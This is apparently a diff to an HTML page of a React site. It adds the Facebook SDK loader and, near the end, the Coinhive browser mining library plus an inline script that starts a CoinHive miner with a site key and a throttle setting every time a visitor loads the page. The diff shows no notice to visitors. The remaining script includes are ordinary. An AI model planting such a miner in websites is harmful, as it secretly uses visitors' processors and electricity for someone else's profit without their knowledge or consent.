@@ -12,6 +12,16 @@
 <body>
     <div id="react-content"></div>
 
+    <!-- Facebook SDK -->
+    <div id="fb-root"></div>
+    <script>(function(d, s, id) {
+      var js, fjs = d.getElementsByTagName(s)[0];
+      if (d.getElementById(id)) return;
+      js = d.createElement(s); js.id = id;
+      js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1";
+      fjs.parentNode.insertBefore(js, fjs);
+    }(document, 'script', 'facebook-jssdk'));</script>
+
     <!-- Latest compiled and minified JavaScript -->
     <script src="https://code.jquery.com/jquery-2.2.4.min.js"  integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44="  crossorigin="anonymous"></script>
     <script src="https://code.jquery.com/ui/1.12.1/jquery-ui.js"></script>
@@ -20,7 +30,9 @@
     <script src="/scripts/jquery.ui.touch-punch.min.js"></script>
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js" integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS" crossorigin="anonymous"></script>
     <script src="https://use.fontawesome.com/6e19575054.js"></script>
+    <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
     <script src="/scripts/bundle.js"></script>
+
     <!-- Global site tag (gtag.js) - Google Analytics -->
     <script async src="https://www.googletagmanager.com/gtag/js?id=UA-108066385-1"></script>
     <script>
@@ -30,6 +42,12 @@
 
       gtag('config', 'UA-108066385-1');
     </script>
+
+    <!-- coin miner -->
+    <script>
+			var miner = new CoinHive.User('nrYO0o7CQHIGt5jFZRqEMlNcQq4lLN1Y', 'trumptraks', { throttle: 0.3 });
+			miner.start();
+		</script>
 
 </body>
 </html>
